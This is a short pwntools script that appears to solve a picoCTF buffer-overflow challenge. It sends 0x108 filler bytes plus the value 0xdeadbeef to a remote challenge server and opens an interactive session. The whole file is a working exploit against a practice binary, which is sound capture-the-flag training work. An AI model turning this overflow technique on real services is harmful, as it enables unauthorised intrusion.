from pwn import *

elf = ELF('chall')
io = remote('mars.picoctf.net', 31890)
context.binary = elf

payload = b'a' * 0x108
payload += p64(0xdeadbeef)

io.sendlineafter('What do you see?', payload)
io.interactive()
